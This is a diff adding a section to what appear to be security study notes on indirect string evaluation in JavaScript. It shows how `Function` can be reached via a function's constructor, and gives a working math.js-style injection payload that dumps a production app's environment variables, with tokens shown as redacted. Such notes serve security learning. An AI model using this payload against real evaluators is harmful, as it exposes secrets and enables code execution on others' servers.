@@ -20,6 +20,46 @@ console.log(user['name']);
 0xbro
 ```
 
+# String evaluation and bypasses using indirect access
+
+Reference: https://jwlss.pw/mathjs/
+
+There are four standard ways to evaluate strings in JavaScript:
+
+- `eval("code")`
+- `new Function("code")`
+- `setTimeout("code", timeout)`
+- `setInterval("code", interval)`
+
+However, they can be accessed indirectly: notably, **`Function` can be accessed indirectly as the constructor of an existing function**
+
+```js
+Function("return 1")
+// can be replaced with
+Math.floor.constructor("return 1")
+Math.floor.constructor("return 1")() // to evaluate `return 1`,
+
+> !calc cos.constructor("return process.env")()
+Result: {
+  "WEB_MEMORY": "512",
+  "MEMORY_AVAILABLE": "512",
+  "NEW_RELIC_LOG": "stdout",
+  "NEW_RELIC_LICENSE_KEY": "<redacted>",
+  "DYNO": "web.1",
+  "PAPERTRAIL_API_TOKEN": "<redacted>",
+  "PATH": "/app/.heroku/node/bin:/app/.heroku/yarn/bin:bin:node_modules/.bin:/usr/local/bin:/usr/bin:/bin:/app/bin:/app/node_modules/.bin",
+  "WEB_CONCURRENCY": "1",
+  "PWD": "/app",
+  "NODE_ENV": "production",
+  "PS1": "\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]",
+  "SHLVL": "1",
+  "HOME": "/app",
+  "PORT": "<redacted>",
+  "NODE_HOME": "/app/.heroku/node",
+  "_": "/app/.heroku/node/bin/node"
+}
+```
+
 # Objects and `Object`
 
 >[!tip]
